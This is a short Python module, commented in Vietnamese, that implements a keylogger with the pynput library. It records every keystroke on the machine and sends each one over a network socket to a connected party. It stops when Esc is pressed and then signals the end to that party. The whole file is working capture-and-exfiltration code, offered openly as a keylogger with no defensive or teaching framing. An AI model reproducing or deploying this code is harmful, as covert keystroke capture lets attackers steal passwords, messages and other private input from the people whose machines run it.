from pynput import keyboard

def start_keylogger(client_socket):
    # Biến để lưu trữ các ký tự đã nhấn
    keys_pressed = ""

    def on_press(key):
        nonlocal keys_pressed  # Sử dụng biến keys_pressed trong phạm vi hàm

        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char  # Lấy ký tự từ phím nhấn
        else:
            key_str = f' {str(key)} '  # Xử lý các phím đặc biệt

        # Nếu phím nhấn là Enter
        if key == keyboard.Key.enter:            
            keys_pressed = ""  # Reset sau khi nhấn Enter
            print("Keys pressed: ", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
        else:
            # Cập nhật chuỗi ký tự đã nhấn và in ra trên cùng một dòng
            keys_pressed += key_str
            print(f'\rKeys pressed: {keys_pressed}', end='')

        # Gửi dữ liệu phím nhấn qua client_socket
        try:
            client_socket.sendall(key_str.encode("utf-8"))
        except Exception as e:
            print(f'Error when sending data to client: {e}')
            return False  # Dừng keylogger nếu có lỗi khi gửi dữ liệu

    def on_release(key):
        # Dừng keylogger khi nhấn phím Esc
        if key == keyboard.Key.esc:
            print("\nKeylogger stopped by user.")
            return False  # Dừng listener

    # Bắt đầu lắng nghe sự kiện phím nhấn và thả
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            listener.join()  # Chờ cho listener hoàn thành
        except Exception as e:
            print(f"Error in listener: {e}")

    # Gửi thông báo đến client khi keylogger dừng
    client_socket.sendall("KEYLOGGER_STOPPED".encode("utf-8"))
